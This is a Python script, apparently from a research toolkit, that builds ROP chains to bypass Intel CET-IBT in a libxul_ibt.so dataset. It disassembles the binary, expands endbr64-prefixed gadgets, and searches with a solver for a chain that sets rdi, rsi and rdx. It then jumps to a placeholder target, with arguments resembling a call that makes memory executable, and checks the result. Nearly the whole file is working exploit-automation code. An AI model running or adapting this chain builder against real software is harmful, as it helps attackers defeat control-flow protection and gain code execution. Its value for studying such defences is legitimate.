#!/usr/bin/env python3
"""
Runner: CET-IBT bypass for libxul_ibt dataset.
Target: 0xdeadbeef(0x400040, 0x1000, 7)
  => rdi=0x400040, rsi=0x1000, rdx=7, then rip=0xdeadbeef

Under CET-IBT, only indirect call/jmp targets need endbr64. The ret
instruction does NOT enforce endbr64 at the landing site. Therefore a
standard ROP chain works — the only constraint is the FIRST gadget
(reached via the hijacked indirect call/jmp) must start with endbr64.

Key challenge: endbr64 gadgets have complex multi-basic-block semantics
(jmp abs chains). We expand these by following direct jumps through the
binary, then build a mixed gadget set:
  - Expanded endbr64 gadgets (for IBT-safe entry + complex operations)
  - Short ret-ending gadgets from the full set (for chain body via ret)
"""
import sys, os, json, time, argparse

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

from capstone import Cs, CS_ARCH_X86, CS_MODE_64, CS_GRP_RET, CS_GRP_JUMP, CS_GRP_CALL
from elftools.elf.elffile import ELFFile

import tools
import solve_engine
from find_reg_gadget_chain import get_edges, sort_edges, get_valid_reg_chain_threads
from paths import CFI_DIR

DATASET_DIR = str(CFI_DIR / 'libxul_ibt')
GADGET_FILE = os.path.join(DATASET_DIR, 'gadget.txt')
CYCLIC_FILE = os.path.join(DATASET_DIR, 'cyclic_matches.json')
BINARY_FILE = os.path.join(DATASET_DIR, 'libxul_ibt.so')


# ── Binary disassembly helpers ──────────────────────────────────────

def load_executable_segments(binary_path):
    with open(binary_path, 'rb') as f:
        elf = ELFFile(f)
        segments = []
        for seg in elf.iter_segments():
            if seg['p_flags'] & 0x1:
                segments.append({
                    'vaddr': seg['p_vaddr'],
                    'data': seg.data(),
                    'size': seg['p_memsz'],
                })
    return segments


def disasm_at(segments, md, vaddr, max_insns=20):
    for seg in segments:
        if seg['vaddr'] <= vaddr < seg['vaddr'] + seg['size']:
            offset = vaddr - seg['vaddr']
            code = seg['data'][offset:offset + 200]
            insns = []
            for insn in md.disasm(code, vaddr, max_insns):
                insns.append(insn)
                if insn.group(CS_GRP_RET) or insn.group(CS_GRP_JUMP) or insn.group(CS_GRP_CALL):
                    break
            return insns
    return []


def is_direct_jmp(insn):
    if not insn.group(CS_GRP_JUMP) or insn.group(CS_GRP_RET):
        return False
    try:
        int(insn.op_str, 16)
        return True
    except ValueError:
        return False


def expand_gadget(segments, md, prefix_parts, jmp_target, max_depth=5):
    parts = list(prefix_parts)
    for _ in range(max_depth):
        insns = disasm_at(segments, md, jmp_target)
        if not insns:
            return None
        for insn in insns:
            parts.append(f'{insn.mnemonic} {insn.op_str}'.strip())
        last = insns[-1]
        if is_direct_jmp(last):
            parts.pop()
            jmp_target = int(last.op_str, 16)
            continue
        else:
            return ' ; '.join(parts)
    return None


# ── Gadget loading ──────────────────────────────────────────────────

def build_gadget_dict(gadget_file, segments, md, max_inst=4):
    """Build a mixed gadget dict:
    1. Short ret-ending gadgets (<=max_inst instructions) from full set
    2. Expanded endbr64 gadgets (jmp abs resolved via binary disasm)
    Returns (gadgets_dict, endbr64_set)
    """
    data = open(gadget_file, 'r').read().split('\n')
    gadgets_dict = {}
    endbr64_set = set()

    for i in range(2, len(data) - 3):
        gg = data[i].split(' : ')
        if len(gg) < 2:
            continue
        addr = gg[0].strip()
        gadget_str = gg[1]

        # Handle endbr64 gadgets
        if gadget_str.startswith('endbr64 ; '):
            endbr64_set.add(addr)
            stripped = gadget_str[len('endbr64 ; '):]
            parts = stripped.split(' ; ')
            tail = parts[-1].strip()
            tail_parts = tail.split()

            # Direct usable (ret/call reg/jmp reg ending)
            if tail in ('ret', 'retf') or \
               ('call' in tail and not (len(tail_parts) == 2 and tail_parts[1].startswith('0x'))) or \
               ('jmp' in tail and not (len(tail_parts) == 2 and tail_parts[1].startswith('0x'))):
                if tools.filler(stripped):
                    try:
                        info = tools.Analysis_gadget(stripped)
                        if info and info is not False:
                            gadgets_dict[addr] = stripped
                    except Exception:
                        pass
                continue

            # Expand jmp abs
            if len(tail_parts) == 2 and tail_parts[0] == 'jmp':
                try:
                    target = int(tail_parts[1], 16)
                except ValueError:
                    continue
                combined = expand_gadget(segments, md, parts[:-1], target)
                if combined and tools.filler(combined):
                    try:
                        info = tools.Analysis_gadget(combined)
                        if info and info is not False:
                            gadgets_dict[addr] = combined
                    except Exception:
                        pass
            continue

        # Short ret-ending gadgets from full set
        parts = gadget_str.split(' ; ')
        if len(parts) > max_inst:
            continue
        if parts[-1] not in ('ret', 'retf'):
            continue
        if not tools.filler(gadget_str):
            continue
        gadgets_dict[addr] = gadget_str

    return gadgets_dict, endbr64_set


# ── Main ────────────────────────────────────────────────────────────

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Run CET-IBT libxul demo")
    parser.add_argument('--dataset-dir', type=str, default=DATASET_DIR)
    parser.add_argument('--gadget-file', type=str, default=None)
    parser.add_argument('--cyclic-file', type=str, default=None)
    parser.add_argument('--binary-file', type=str, default=None)
    parser.add_argument('--search-depth', type=int, default=3)
    parser.add_argument('--timeout', type=int, default=10 * 60)
    args = parser.parse_args()

    dataset_dir = args.dataset_dir
    gadget_file = args.gadget_file or os.path.join(dataset_dir, 'gadget.txt')
    cyclic_file = args.cyclic_file or os.path.join(dataset_dir, 'cyclic_matches.json')
    binary_file = args.binary_file or os.path.join(dataset_dir, 'libxul_ibt.so')

    print("=" * 60)
    print("CET-IBT Bypass: libxul_ibt")
    print("Target: 0xdeadbeef(0x400040, 0x1000, 7)")
    print("  rdi=0x400040, rsi=0x1000, rdx=7")
    print("=" * 60)

    # 1. Load binary
    print("\n[1] Loading binary for disassembly...")
    t_load_start = time.time()
    segments = load_executable_segments(binary_file)
    md = Cs(CS_ARCH_X86, CS_MODE_64)
    md.detail = True

    # 2. Build mixed gadget dict
    print("\n[2] Building mixed gadget dict (short ret + expanded endbr64)...")
    gadgets_dict, endbr64_set = build_gadget_dict(gadget_file, segments, md, max_inst=4)
    gadget_load_time = time.time() - t_load_start
    endbr_in_dict = sum(1 for a in endbr64_set if a in gadgets_dict)
    print(f"    {len(gadgets_dict)} gadgets ({endbr_in_dict} endbr64)")
    print(f"[TIMING] Gadget Load Time: {gadget_load_time:.2f}s")

    # 3. Parse registers and memory map
    print("\n[3] Parsing registers and memory map...")
    t_solve_start = time.time()
    (permission_table, regs_init) = tools.get_map_regs(dataset_dir)
    print(f"    rax={hex(regs_init['rax'])}, rsp={hex(regs_init['rsp'])}")

    # 4. Controllable memory
    with open(cyclic_file, 'r', encoding='utf-8') as f:
        controllable_mem_data = json.load(f)
    controllable_mem_data = sorted(controllable_mem_data, key=lambda x: int(x['start_addr'], 16))
    controble_addr_base = int(controllable_mem_data[0]['start_addr'], 16)
    controble_length = controllable_mem_data[0]['length']
    print(f"    Controllable: {hex(controble_addr_base)}, {controble_length} bytes")

    # 5. Setup solver state
    stack_pivot_chain = ['0x10000 -> ret']
    offset_list = list(range(controble_length // 8))
    rsp_idx = (regs_init['rsp'] - controble_addr_base) // 8
    address_map = {rsp_idx: "0xdeadbeef"}
    # Only remove the rsp_idx slot (where the first gadget addr goes)
    offset_list = [i for i in offset_list if i != rsp_idx]

    controllable_regs = ['rsp','rax']
    target_regs = [
        {'reg_name': 'rdi', 'reg_value': 0x400040},
        {'reg_name': 'rsi', 'reg_value': 0x1000},
        {'reg_name': 'rdx', 'reg_value': 7},
    ]
    bss_address = 0x7f000a372000 + 0x308

    gadgets_info = solve_engine.GadgetsInfo(
        gadget_file, regs_init, stack_pivot_chain, gadgets_dict,
        address_map, offset_list, controllable_mem_data,
        controble_addr_base, target_regs, [],
        controllable_regs, permission_table, bss_address,
        endbr64_addrs=endbr64_set
    )

    target_reg_names = [t['reg_name'] for t in target_regs]

    # 6. Build edges
    print("\n[4] Building data-flow edges...")
    t0 = time.time()
    edges = get_edges(gadgets_dict, controllable_regs, target_reg_names)
    if edges is None or len(edges) == 0:
        print("    FAILED: no edges found")
        sys.exit(1)
    print(f"    Found {len(edges)} edges in {time.time()-t0:.1f}s")

    # 7. Sort edges
    print("\n[5] Sorting edges...")
    edges = sort_edges(gadgets_info, edges)
    if edges is None or len(edges) == 0:
        print("    FAILED: no edges after sorting")
        sys.exit(1)
    print(f"    {len(edges)} edges after sorting")

    # 8. Search for valid chain
    print(f"\n[6] Searching for valid gadget chain (timeout={args.timeout}s)...")
    print(f"    Targets: {', '.join(f'{t['reg_name']}={hex(t['reg_value'])}' for t in target_regs)}")
    t0 = time.time()
    reg_res = get_valid_reg_chain_threads(
        gadgets_info, target_reg_names, edges, controllable_regs,
        gadgets_dict, search_depth=args.search_depth, timeout=args.timeout, mode=1
    )
    elapsed = time.time() - t0

    if not reg_res or len(reg_res) == 0:
        print(f"    FAILED ({elapsed:.1f}s)")
        sys.exit(1)

    # reg_res is a ListProxy: [[address_map, gadget_chain_list]]
    solve_res = reg_res[0][0]
    gadget_seq = reg_res[0][1]
    print(f"    SUCCESS in {elapsed:.1f}s")

    # Fix solver placeholder: 0xdeadbeXX -> 0xdeadbeef
    for idx, v in list(solve_res.items()):
        if isinstance(v, str) and v.startswith('0xdeadbe') and v != '0xdeadbeef':
            solve_res[idx] = '0xdeadbeef'
        elif isinstance(v, int) and (v & 0xffffff00) == 0xdeadbe00:
            solve_res[idx] = '0xdeadbeef'

    # 9. Ensure IBT-safe entry — prepend endbr64 trampoline if needed
    entry_addr = str(solve_res[min(solve_res.keys())])
    if entry_addr not in endbr64_set:
        trampoline = None
        for addr in endbr64_set:
            if addr in gadgets_dict and gadgets_dict[addr] == 'push rbp ; mov rbp, rsp ; pop rbp ; ret':
                trampoline = addr
                break
        if trampoline:
            print(f"\n[7] Prepending endbr64 trampoline: {trampoline}")
            min_idx = min(solve_res.keys())
            new_res = {min_idx: trampoline}
            for idx in sorted(solve_res.keys()):
                new_res[idx + 1] = solve_res[idx]
            solve_res = new_res

    # 10. Report
    print("\n" + "=" * 60)
    print("CHAIN LAYOUT:")
    print("=" * 60)
    for idx in sorted(solve_res.keys()):
        v = str(solve_res[idx])
        addr_hex = hex(controble_addr_base + idx * 8)
        is_endbr = " [endbr64]" if v in endbr64_set else ""
        if v in gadgets_dict:
            print(f"  [{idx:3d}] {addr_hex} = {v}  ({gadgets_dict[v]}){is_endbr}")
        else:
            print(f"  [{idx:3d}] {addr_hex} = {v}{is_endbr}")

    # 11. Verify
    print("\nVerifying chain...")
    check_res = solve_engine.check(gadgets_info, solve_res)
    if check_res[0]:
        print(f"Verification: PASS")
        print(f"\nCET-IBT bypass successful!")
        print(f"  Entry gadget has endbr64: {str(solve_res[min(solve_res.keys())]) in endbr64_set}")
        print(f"  Chain sets: rdi=0x400040, rsi=0x1000, rdx=7")
        print(f"  Then jumps to: 0xdeadbeef")
    else:
        print(f"Verification: FAIL {check_res}")

    solve_time = time.time() - t_solve_start
    print(f"\n[TIMING] Gadget Load Time: {gadget_load_time:.2f}s")
    print(f"[TIMING] Solve Time: {solve_time:.2f}s")
    print(f"[TIMING] Total Time: {gadget_load_time + solve_time:.2f}s")
    print("=" * 60)
